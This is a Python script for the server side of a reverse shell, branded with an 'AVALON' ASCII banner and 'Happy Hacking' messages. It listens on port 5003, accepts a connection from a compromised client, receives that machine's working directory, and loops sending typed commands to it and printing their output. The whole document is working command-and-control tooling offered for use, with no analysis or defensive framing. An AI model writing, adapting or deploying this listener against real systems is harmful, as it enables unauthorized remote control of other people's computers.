import socket

# server side
SERVER_HOST = "0.0.0.0"
SERVER_PORT = 5003
BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free to increase
# separator string for sending 2 messages in one go
SEPARATOR = ":"

# banner
print("""
\033[1;31m\033[1;37m
 ▄▄▄    ██▒   █▓ ▄▄▄       ██▓     ▒█████   ███▄    █
▒████▄ ▓██░   █▒▒████▄    ▓██▒    ▒██▒  ██▒ ██ ▀█   █
▒██  ▀█▄▓██  █▒░▒██  ▀█▄  ▒██░    ▒██░  ██▒▓██  ▀█ ██▒
░██▄▄▄▄██▒██ █░░░██▄▄▄▄██ ▒██░    ▒██   ██░▓██▒  ▐▌██▒
 ▓█   ▓██▒▒▀█░   ▓█   ▓██▒░██████▒░ ████▓▒░▒██░   ▓██░
 ▒▒   ▓▒█░░ ▐░   ▒▒   ▓▒█░░ ▒░▓  ░░ ▒░▒░▒░ ░ ▒░   ▒ ▒
  ▒   ▒▒ ░░ ░░    ▒   ▒▒ ░░ ░ ▒  ░  ░ ▒ ▒░ ░ ░░   ░ ▒░
  ░   ▒     ░░    ░   ▒     ░ ░   ░ ░ ░ ▒     ░   ░ ░
      ░  ░   ░        ░  ░    ░  ░    ░ ░           ░
\033[1;31mSERVER SIDE                   coded by kiana\033[1;31m\033[1;37m""")
print("")

# socket object
s = socket.socket()

# bind the socket to all IP addresses of this host
s.bind((SERVER_HOST, SERVER_PORT))
# make the PORT reusable
# when you run the server multiple times in Linux, Address already in use error will raise
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.listen(5)
print(f"nyahallo {SERVER_HOST}:{SERVER_PORT} ...")

# accept any connections attempted
client_socket, client_address = s.accept()
print(f"{client_address[0]}:{client_address[1]} Connected!")

# receiving the current working directory of the client
cwd = client_socket.recv(BUFFER_SIZE).decode()
print("[XwX] Happy Hacking:", cwd)

while True:
    # get the command from prompt
    command = input(f"{cwd} -> ")
    if not command.strip():
        # empty command
        continue
    # send the command to the client
    client_socket.send(command.encode())
    if command.lower() == "exit":
        # if the command is exit, just break out of the loop
        break
    # retrieve command results
    output = client_socket.recv(BUFFER_SIZE).decode()
    print("split:", output)
    # split command output and current directory
    results, cwd = output.split(SEPARATOR)
    # print output
    print(results)
# close connection to the client
client_socket.close()
# close server connection
s.close()
